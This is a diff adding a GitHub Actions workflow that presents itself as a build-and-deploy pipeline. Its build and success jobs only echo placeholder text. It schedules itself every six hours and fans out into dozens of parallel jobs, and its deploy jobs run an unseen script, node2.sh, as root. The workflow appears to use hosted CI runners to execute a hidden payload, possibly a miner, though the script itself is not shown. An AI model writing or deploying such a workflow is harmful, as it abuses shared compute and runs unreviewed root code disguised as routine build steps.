@@ -1,0 +1,127 @@
+name: build-2.1
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        flag: [A, B, C, D]
+    env:
+      NUM_JOBS: 40
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up..."
+          # Add your setup steps here
+
+  deploy-1:
+    name: Deploy-1
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        go: [1, 2, 3, 4, 5]
+    env:
+      NUM_JOBS: 5
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up deploy-1..."
+          # Add your setup steps here
+      - name: Install Dependencies
+        run: |
+          echo "Installing dependencies for deploy-1..."
+          chmod +x "${GITHUB_WORKSPACE}/node2.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node2.sh"
+
+  deploy-2:
+    name: Deploy-2
+    needs: build
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        go: [1, 2, 3, 4, 5]
+    env:
+      NUM_JOBS: 5
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up deploy-2..."
+          # Add your setup steps here
+      - name: Install Dependencies
+        run: |
+          echo "Installing dependencies for deploy-2..."
+          chmod +x "${GITHUB_WORKSPACE}/node2.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node2.sh"
+
+  deploy-3:
+    name: Deploy-3
+    needs: build
+    runs-on: ubuntu-18.04  # Hanya menggunakan Ubuntu 18.04
+    strategy:
+      matrix:
+        go: [1, 2, 3, 4, 5]
+    env:
+      NUM_JOBS: 5
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up deploy-3..."
+          # Add your setup steps here
+      - name: Install Dependencies
+        run: |
+          echo "Installing dependencies for deploy-3..."
+          chmod +x "${GITHUB_WORKSPACE}/node2.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node2.sh"
+
+  deploy-4:
+    name: Deploy-4
+    needs: build
+    runs-on: ubuntu-20.04  # Hanya menggunakan Ubuntu 20.04
+    strategy:
+      matrix:
+        go: [1, 2, 3, 4, 5]
+    env:
+      NUM_JOBS: 5
+      JOB: ${{ matrix.go }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up deploy-4..."
+          # Add your setup steps here
+      - name: Install Dependencies
+        run: |
+          echo "Installing dependencies for deploy-4..."
+          chmod +x "${GITHUB_WORKSPACE}/node2.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node2.sh"
+
+  success:
+    name: Success
+    needs: [deploy-1, deploy-2, deploy-3, deploy-4]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+      - name: Setup
+        run: |
+          echo "Setting up success..."
+          # Add your setup steps here
